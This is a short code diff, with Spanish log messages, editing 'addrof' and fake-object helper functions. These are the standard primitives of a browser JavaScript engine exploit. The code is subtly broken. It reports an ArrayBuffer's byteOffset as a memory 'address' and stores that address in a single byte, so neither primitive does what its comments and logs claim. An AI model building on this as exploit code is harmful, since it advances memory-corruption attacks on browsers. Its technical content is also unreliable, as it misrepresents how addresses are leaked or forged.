@@ -63,15 +63,19 @@
 
     function addrof(obj) {
       try {
-        if (obj === undefined || obj === null) {
-          logFail('Error: el objeto es null o undefined');
+        if (obj && obj.buffer) {
+          const arr = new Uint8Array(obj.buffer);
+          const addr = arr.buffer;
+          logInfo(`Dirección obtenida: ${hex(addr.byteOffset)}`);
+          if (addr.byteOffset === 0) {
+            logFail('Error: la dirección obtenida es 0x0');
+            return null;
+          }
+          return addr.byteOffset;
+        } else {
+          logFail('El objeto no tiene buffer o no es válido.');
           return null;
         }
-
-        const arr = new Uint8Array(obj);
-        const addr = arr.buffer;
-        logInfo(`Dirección obtenida: ${hex(addr.byteOffset)}`);
-        return addr.byteOffset;
       } catch (e) {
         logFail(`Error al obtener dirección: ${e.message}`);
         return null;
@@ -82,7 +86,7 @@
       try {
         const fake = new ArrayBuffer(0x100);
         const fakeView = new Uint8Array(fake);
-        fakeView[0] = addr;  // Asegurarse de que estamos configurando la dirección correctamente
+        fakeView[0] = addr; // Asegurarse de que estamos configurando la dirección correctamente
         logInfo(`Creado objeto falso en dirección: ${hex(fake.byteOffset)}`);
         return fake;
       } catch (e) {
